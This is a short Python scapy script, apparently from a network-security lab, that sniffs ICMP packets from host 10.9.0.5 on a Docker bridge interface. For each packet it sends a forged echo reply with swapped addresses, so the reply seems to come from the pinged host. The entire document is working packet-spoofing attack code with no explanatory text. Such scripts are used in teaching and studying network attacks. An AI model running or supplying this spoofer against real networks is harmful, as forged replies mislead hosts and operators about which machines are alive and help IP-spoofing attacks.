from scapy.all import *


def spoof_packet(pkt):

    if 'ICMP' in pkt:

        print ('-----------')
        print('original packet')
        print('source IP', pkt['IP'].src)
        print('dest IP', pkt['IP'].dst)
        print ('-----------')
        print ()

        new_dest_ip = pkt['IP'].src
        new_src_ip = pkt['IP'].dst

        new_ihl = pkt['IP'].ihl

        new_type = 0

        new_id = pkt['ICMP'].id
        new_seq = pkt['ICMP'].seq or 0

        data = pkt['Raw'].load

        a = IP(src=new_src_ip, dst=new_dest_ip, ihl=new_ihl)
        b = ICMP(type=new_type, id=new_id, seq=new_seq)
        new_pkt = a/b/data

        print ('-----------')
        print('spoofed packet')
        print('source IP', new_pkt['IP'].src)
        print('dest IP', new_pkt['IP'].dst)
        print ('-----------')
        
        print ()
        
        send(new_pkt, verbose=0)


pkt = sniff(iface="br-ce2219c0e00d", filter='icmp and src host 10.9.0.5', prn=spoof_packet)
